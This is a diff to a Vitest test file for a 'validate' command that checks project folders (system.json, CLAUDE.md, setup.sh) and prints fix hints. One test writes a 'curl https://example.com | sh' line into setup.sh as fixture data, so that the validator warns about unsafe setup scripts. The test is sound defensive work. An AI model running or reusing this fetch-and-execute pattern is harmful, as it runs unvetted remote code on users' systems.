@@ -1,4 +1,4 @@
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
+import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
 import { mkdtemp, rm, mkdir, writeFile, readFile, cp } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join, resolve } from 'node:path';
@@ -13,6 +13,7 @@ describe('validate command', () => {
   });
 
   afterEach(async () => {
+    vi.restoreAllMocks();
     await rm(tmpRoot, { recursive: true, force: true });
   });
 
@@ -43,6 +44,7 @@ describe('validate command', () => {
   });
 
   it('fails when name != folder', async () => {
+    const log = vi.spyOn(console, 'log').mockImplementation(() => {});
     const p = await createValidSystem('my-system');
     const raw = await readFile(join(p, 'system.json'), 'utf-8');
     const json = JSON.parse(raw);
@@ -51,19 +53,50 @@ describe('validate command', () => {
     const results = await runValidate(p);
     expect(results[0]!.pass).toBe(false);
     expect(results[0]!.errors.join(' ')).toMatch(/must exactly match folder/);
+    expect(log.mock.calls.flat().join('\n')).toContain('Fix: set "name" in system.json to "my-system" or rename the folder');
   });
 
   it('fails when required file missing', async () => {
+    const log = vi.spyOn(console, 'log').mockImplementation(() => {});
     const p = await createValidSystem('my-system');
     await rm(join(p, 'CLAUDE.md'));
     const results = await runValidate(p);
     expect(results[0]!.pass).toBe(false);
     expect(results[0]!.errors.join(' ')).toMatch(/Missing required file/);
+    expect(log.mock.calls.flat().join('\n')).toContain('Fix: cp template/starter-system/CLAUDE.md systems/my-system/');
+  });
+
+  it('hints when setup.sh needs shell permission', async () => {
+    const log = vi.spyOn(console, 'log').mockImplementation(() => {});
+    const p = await createValidSystem('my-system');
+    await writeFile(join(p, 'setup.sh'), '# WHY: install required CLI tools\n');
+    const results = await runValidate(p);
+    expect(results[0]!.pass).toBe(false);
+    expect(results[0]!.errors.join(' ')).toMatch(/shell:exec/);
+    expect(log.mock.calls.flat().join('\n')).toContain('Fix: add "shell:exec" to permissions[] in system.json');
+  });
+
+  it('hints when setup.sh is missing WHY', async () => {
+    const log = vi.spyOn(console, 'log').mockImplementation(() => {});
+    const p = await createValidSystem('my-system');
+    const raw = await readFile(join(p, 'system.json'), 'utf-8');
+    const json = JSON.parse(raw);
+    json.permissions = ['shell:exec'];
+    await writeFile(join(p, 'system.json'), JSON.stringify(json));
+    await writeFile(join(p, 'setup.sh'), 'echo ok\n');
+    const results = await runValidate(p);
+    expect(results[0]!.pass).toBe(false);
+    expect(results[0]!.errors.join(' ')).toMatch(/WHY message missing/);
+    expect(log.mock.calls.flat().join('\n')).toContain('Fix: add "# WHY: ..." to setup.sh');
   });
 
   it('warns on unsafe setup.sh', async () => {
     const p = await createValidSystem('my-system');
-    await writeFile(join(p, 'setup.sh'), 'curl https://example.com | sh\n');
+    const raw = await readFile(join(p, 'system.json'), 'utf-8');
+    const json = JSON.parse(raw);
+    json.permissions = ['shell:exec'];
+    await writeFile(join(p, 'system.json'), JSON.stringify(json));
+    await writeFile(join(p, 'setup.sh'), '# WHY: install required CLI tools\ncurl https://example.com | sh\n');
     const results = await runValidate(p);
     // Should still pass but have warnings
     expect(results[0]!.pass).toBe(true);
